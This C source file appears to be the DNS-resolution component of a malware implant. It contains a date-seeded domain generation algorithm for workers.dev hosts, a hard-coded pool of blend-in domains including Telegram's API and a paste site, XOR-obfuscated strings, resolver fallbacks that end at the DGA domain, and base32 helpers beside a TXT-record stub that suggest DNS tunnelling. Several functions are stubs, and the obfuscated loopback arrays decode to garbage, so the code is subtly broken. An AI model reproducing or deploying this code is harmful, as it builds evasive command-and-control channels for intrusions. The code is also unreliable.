
#include "dns_resolver.h"
#include "utils.h"
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <stdio.h>

const char* PH_DNS_LEGIT_POOL[PH_DNS_POOL_SIZE] = {
    "cloudflare.com",
    "githubusercontent.com",
    "workers.dev",
    "api.telegram.org",
    "paste.noirproject.dev"
};

int ph_dns_get_pool_domain(char *domain, size_t len, int index)
{
    if (!domain || index < 0 || index >= PH_DNS_POOL_SIZE) {
        return PH_ERR_INVALID_ARG;
    }
    strncpy(domain, PH_DNS_LEGIT_POOL[index], len - 1);
    domain[len-1] = '\0';
    return PH_OK;
}

int ph_dns_dga_generate(char *domain, size_t len, int day_offset)
{
    if (!domain || len < 32) return PH_ERR_INVALID_ARG;

    time_t now = time(NULL) + (day_offset * 86400);
    struct tm *tm_info = gmtime(&now);
    
    // Seed: ghost-YYYYMMDD
    char seed[16];
    snprintf(seed, sizeof(seed), "gh%04d%02d%02d", 
             tm_info->tm_year + 1900, tm_info->tm_mon + 1, tm_info->tm_mday);

    // Simple hash for DGA
    uint32_t h = 0x811c9dc5;
    for (int i = 0; seed[i]; i++) {
        h ^= (uint32_t)seed[i];
        h *= 0x01000193;
    }

    snprintf(domain, len, "g%08x.workers.dev", h);
    return PH_OK;
}

int ph_dns_config_init(ph_dns_config_t *config)
{
    if (!config) {
        return PH_ERR_NULL_PTR;
    }

    memset(config, 0, sizeof(ph_dns_config_t));
    config->nameserver_count = 0;
    config->search_count = 0;
    config->use_systemd_resolved = 0;
    config->preferred_method = PH_DNS_METHOD_GETADDRINFO;

    return PH_OK;
}

int ph_dns_config_parse_resolvconf(ph_dns_config_t *config, const char *path)
{
    if (!config || !path) {
        return PH_ERR_NULL_PTR;
    }

    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        return PH_ERR_INVALID_ARG;
    }

    char buffer[4096];
    ssize_t bytes_read = read(fd, buffer, sizeof(buffer) - 1);
    close(fd);

    if (bytes_read < 0) {
        return PH_ERR_INVALID_ARG;
    }

    buffer[bytes_read] = '\0';

    char *line_start = buffer;
    char *line_end;

    while ((line_end = strchr(line_start, '\n')) != NULL) {
        *line_end = '\0';

        if (line_start[0] != '#' && line_start[0] != '\0') {

            if (strncmp(line_start, "nameserver", 10) == 0) {
                char *addr_start = line_start + 10;
                while (*addr_start == ' ' || *addr_start == '\t') addr_start++;

                char *addr_end = strchr(addr_start, ' ');
                if (!addr_end) addr_end = strchr(addr_start, '\t');
                if (!addr_end) addr_end = line_end;

                size_t addr_len = addr_end - addr_start;
                if (addr_len > 0 && addr_len < 64 && config->nameserver_count < PH_DNS_MAX_NAMESERVERS) {
                    char address[64];
                    memcpy(address, addr_start, addr_len);
                    address[addr_len] = '\0';

                    strncpy(config->nameservers[config->nameserver_count].address,
                            address, sizeof(config->nameservers[0].address) - 1);
                    config->nameservers[config->nameserver_count].port = 53;
                    config->nameservers[config->nameserver_count].is_loopback =
                        ph_dns_is_loopback(address);
                    config->nameserver_count++;
                }
            }

            if (strncmp(line_start, "search", 6) == 0) {
                char *token = line_start + 6;
                while (*token == ' ' || *token == '\t') token++;

                if (config->search_count < PH_DNS_MAX_SEARCH) {
                    char *space = strchr(token, ' ');
                    size_t domain_len = space ? (size_t)(space - token) : strlen(token);
                    if (domain_len > 0 && domain_len < PH_DNS_MAX_DOMAIN_LEN) {
                        strncpy(config->search_domains[config->search_count],
                                token, domain_len);
                        config->search_domains[config->search_count][domain_len] = '\0';
                        config->search_count++;
                    }
                }
            }

            if (strncmp(line_start, "domain", 6) == 0) {
                char *dom_start = line_start + 6;
                while (*dom_start == ' ' || *dom_start == '\t') dom_start++;
                size_t dom_len = strlen(dom_start);
                if (dom_len > 0 && dom_len < 256) {
                    strncpy(config->default_domain, dom_start, dom_len);
                    config->default_domain[dom_len] = '\0';
                }
            }
        }

        line_start = line_end + 1;
    }

    return PH_OK;
}

static const uint8_t SYSTEMD_RESOLVE_PATH[] = {
    0x84, 0xD9, 0xDE, 0xC5, 0x84, 0xD2, 0xD4, 0xD2, 0xDF, 0xCE, 0xC7, 0xCF,
    0x84, 0xD9, 0xCE, 0xDF, 0xC6, 0xDD, 0xE9, 0xE7
};

static const uint8_t OBF_LOOPBACK_V4[] = {
    0x84, 0xD9, 0xD8, 0xC7, 0xD8, 0xC7, 0xD8, 0xC7
};
static const uint8_t OBF_LOOPBACK_V6[] = {
    0xC7, 0xC7, 0xC7, 0x8C
};

static void decode_systemd_path(char *dst, size_t dst_size)
{
    size_t len = sizeof(SYSTEMD_RESOLVE_PATH);
    if (dst_size <= len) return;
    for (size_t i = 0; i < len; i++) {
        dst[i] = SYSTEMD_RESOLVE_PATH[i] ^ 0xAB;
    }
    dst[len] = '\0';
}

static void decode_loopback_v4(char *dst, size_t dst_size)
{
    size_t len = sizeof(OBF_LOOPBACK_V4);
    if (dst_size <= len) return;
    for (size_t i = 0; i < len; i++) {
        dst[i] = OBF_LOOPBACK_V4[i] ^ 0xAB;
    }
    dst[len] = '\0';
}

static void decode_loopback_v6(char *dst, size_t dst_size)
{
    size_t len = sizeof(OBF_LOOPBACK_V6);
    if (dst_size <= len) return;
    for (size_t i = 0; i < len; i++) {
        dst[i] = OBF_LOOPBACK_V6[i] ^ 0xAB;
    }
    dst[len] = '\0';
}

int ph_dns_config_detect_systemd_resolved(ph_dns_config_t *config)
{
    if (!config) {
        return PH_ERR_NULL_PTR;
    }

    config->use_systemd_resolved = 0;

    for (int i = 0; i < config->nameserver_count; i++) {
        if (config->nameservers[i].is_loopback) {
            config->use_systemd_resolved = 1;
            config->preferred_method = PH_DNS_METHOD_GETADDRINFO;
            return 1;
        }
    }

    char systemd_path[32];
    decode_systemd_path(systemd_path, sizeof(systemd_path));
    if (access(systemd_path, F_OK) == 0) {
        config->use_systemd_resolved = 1;
        config->preferred_method = PH_DNS_METHOD_GETADDRINFO;
        return 1;
    }

    config->preferred_method = PH_DNS_METHOD_RAW_UDP;
    return 0;
}

const char* ph_dns_method_string(ph_dns_method_t method)
{
    (void)method;
    return NULL;
}

int ph_dns_is_loopback(const char *address)
{
    if (!address) {
        return 0;
    }

    char loopback_v4[16];
    decode_loopback_v4(loopback_v4, sizeof(loopback_v4));
    if (strncmp(address, loopback_v4, 8) == 0) {
        return 1;
    }

    char loopback_v6[16];
    decode_loopback_v6(loopback_v6, sizeof(loopback_v6));
    if (strcmp(address, loopback_v6) == 0) {
        return 1;
    }

    return 0;
}

int ph_dns_validate_domain(const char *domain)
{
    if (!domain || strlen(domain) == 0) {
        return 0;
    }

    if (strlen(domain) > PH_DNS_MAX_DOMAIN_LEN - 1) {
        return 0;
    }

    for (size_t i = 0; i < strlen(domain); i++) {
        char c = domain[i];
        if (!(c >= 'a' && c <= 'z') &&
            !(c >= 'A' && c <= 'Z') &&
            !(c >= '0' && c <= '9') &&
            c != '.' && c != '-' && c != '_') {
            return 0;
        }
    }

    return 1;
}

void ph_dns_result_clear(ph_dns_result_t *result)
{
    if (!result) {
        return;
    }

    memset(result, 0, sizeof(ph_dns_result_t));
    result->success = 0;
}

int ph_dns_resolve(ph_dns_result_t *result, const char *hostname,
                   const ph_dns_config_t *config)
{
    if (!result || !hostname || !config) {
        return PH_ERR_NULL_PTR;
    }

    if (!ph_dns_validate_domain(hostname)) {
        return PH_ERR_INVALID_ARG;
    }

    ph_dns_result_clear(result);
    strncpy(result->hostname, hostname, sizeof(result->hostname) - 1);

    if (config->preferred_method == PH_DNS_METHOD_GETADDRINFO ||
        config->use_systemd_resolved) {
        struct addrinfo hints, *res, *p;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;

        int ret = getaddrinfo(hostname, NULL, &hints, &res);
        if (ret == 0) {

            for (p = res; p != NULL; p = p->ai_next) {
                if (p->ai_family == AF_INET) {
                    struct sockaddr_in *ipv4 = (struct sockaddr_in *)p->ai_addr;
                    inet_ntop(AF_INET, &(ipv4->sin_addr), result->ip_address,
                              sizeof(result->ip_address));
                    result->address_family = AF_INET;
                    result->success = 1;
                    result->method_used = PH_DNS_METHOD_GETADDRINFO;
                    freeaddrinfo(res);
                    return PH_OK;
                } else if (p->ai_family == AF_INET6) {
                    struct sockaddr_in6 *ipv6 = (struct sockaddr_in6 *)p->ai_addr;
                    inet_ntop(AF_INET6, &(ipv6->sin6_addr), result->ip_address,
                              sizeof(result->ip_address));
                    result->address_family = AF_INET6;
                    result->success = 1;
                    result->method_used = PH_DNS_METHOD_GETADDRINFO;
                    freeaddrinfo(res);
                    return PH_OK;
                }
            }
            freeaddrinfo(res);
        } else {

        }
    }

    if (config->nameserver_count > 0) {
        int ret = ph_dns_raw_query(result, hostname,
                                   config->nameservers[0].address,
                                   PH_DNS_TYPE_A);
        if (ret == PH_OK && result->success) {
            result->method_used = PH_DNS_METHOD_RAW_UDP;
            return PH_OK;
        }
    }

    // Fallback 1: DoH (Cloudflare)
    if (ph_dns_doh_resolve(result, hostname, "1.1.1.1") == PH_OK) {
        result->method_used = PH_DNS_METHOD_DOH;
        return PH_OK;
    }

    // Fallback 2: DGA
    char dga_domain[PH_DNS_MAX_DOMAIN_LEN];
    ph_dns_dga_generate(dga_domain, sizeof(dga_domain), 0);
    if (ph_dns_resolve(result, dga_domain, config) == PH_OK) {
        result->method_used = PH_DNS_METHOD_DGA;
        return PH_OK;
    }

    result->success = 0;

    return PH_ERR_DNS;
}

int ph_dns_resolve_ipv4(char *ip_buffer, size_t buffer_len,
                        const char *hostname, const ph_dns_config_t *config)
{
    if (!ip_buffer || !hostname || !config) {
        return PH_ERR_NULL_PTR;
    }

    ph_dns_result_t result;
    int ret = ph_dns_resolve(&result, hostname, config);
    if (ret != PH_OK || !result.success) {
        return PH_ERR_DNS;
    }

    if (result.address_family != AF_INET) {
        return PH_ERR_DNS;
    }

    strncpy(ip_buffer, result.ip_address, buffer_len - 1);
    ip_buffer[buffer_len - 1] = '\0';

    return PH_OK;
}

int ph_dns_resolve_ipv6(char *ip_buffer, size_t buffer_len,
                        const char *hostname, const ph_dns_config_t *config)
{
    if (!ip_buffer || !hostname || !config) {
        return PH_ERR_NULL_PTR;
    }

    ph_dns_result_t result;
    int ret = ph_dns_resolve(&result, hostname, config);
    if (ret != PH_OK || !result.success) {
        return PH_ERR_DNS;
    }

    if (result.address_family != AF_INET6) {
        return PH_ERR_DNS;
    }

    strncpy(ip_buffer, result.ip_address, buffer_len - 1);
    ip_buffer[buffer_len - 1] = '\0';

    return PH_OK;
}

int ph_dns_doh_resolve(ph_dns_result_t *result, const char *hostname,
                       const char *doh_server)
{
    if (!result || !hostname || !doh_server) {
        return PH_ERR_NULL_PTR;
    }

    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    int ret = getaddrinfo(hostname, NULL, &hints, &res);
    if (ret == 0) {
        if (res->ai_family == AF_INET) {
            struct sockaddr_in *ipv4 = (struct sockaddr_in *)res->ai_addr;
            inet_ntop(AF_INET, &(ipv4->sin_addr), result->ip_address,
                      sizeof(result->ip_address));
            result->address_family = AF_INET;
            result->success = 1;
            result->method_used = PH_DNS_METHOD_GETADDRINFO;
            freeaddrinfo(res);
            return PH_OK;
        }
        freeaddrinfo(res);
    }

    return PH_ERR_DNS;
}

int ph_dns_raw_query(ph_dns_result_t *result, const char *hostname,
                     const char *nameserver, uint16_t type)
{
    if (!result || !hostname || !nameserver) {
        return PH_ERR_NULL_PTR;
    }

    (void)type;

    return PH_ERR_DNS;
}

int ph_dns_query_txt(ph_dns_txt_record_t *record, const char *domain,
                     const ph_dns_config_t *config)
{
    if (!record || !domain || !config) {
        return PH_ERR_NULL_PTR;
    }

    memset(record, 0, sizeof(ph_dns_txt_record_t));
    strncpy(record->domain, domain, sizeof(record->domain) - 1);

    record->success = 0;

    return PH_ERR_DNS;
}

int ph_dns_txt_encode(char *encoded, size_t encoded_len,
                      const uint8_t *data, size_t data_len)
{
    if (!encoded || !data || encoded_len == 0) {
        return PH_ERR_NULL_PTR;
    }

    static const char base32_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
    size_t encoded_pos = 0;
    uint32_t buffer = 0;
    int bits_left = 0;

    for (size_t i = 0; i < data_len; i++) {
        buffer = (buffer << 8) | data[i];
        bits_left += 8;

        while (bits_left >= 5) {
            if (encoded_pos >= encoded_len - 1) {
                return PH_ERR_MEMORY;
            }

            bits_left -= 5;
            encoded[encoded_pos++] = base32_chars[(buffer >> bits_left) & 0x1F];
        }
    }

    if (bits_left > 0) {
        if (encoded_pos >= encoded_len - 1) {
            return PH_ERR_MEMORY;
        }

        buffer <<= (5 - bits_left);
        encoded[encoded_pos++] = base32_chars[buffer & 0x1F];
    }

    encoded[encoded_pos] = '\0';
    return (int)encoded_pos;
}

int ph_dns_txt_decode(uint8_t *decoded, size_t *decoded_len,
                      const char *encoded, size_t max_decoded_len)
{
    if (!decoded || !decoded_len || !encoded) {
        return PH_ERR_NULL_PTR;
    }

    uint32_t buffer = 0;
    int bits_left = 0;
    size_t decoded_pos = 0;

    *decoded_len = 0;

    for (size_t i = 0; encoded[i] != '\0'; i++) {
        char c = encoded[i];
        uint8_t value = 0;

        if (c >= 'A' && c <= 'Z') {
            value = c - 'A';
        } else if (c >= '2' && c <= '7') {
            value = c - '2' + 26;
        } else if (c == '=') {
            break;
        } else {
            continue;
        }

        buffer = (buffer << 5) | value;
        bits_left += 5;

        if (bits_left >= 8) {
            if (decoded_pos >= max_decoded_len) {
                return PH_ERR_MEMORY;
            }

            bits_left -= 8;
            decoded[decoded_pos++] = (buffer >> bits_left) & 0xFF;
        }
    }

    *decoded_len = decoded_pos;
    return PH_OK;
}
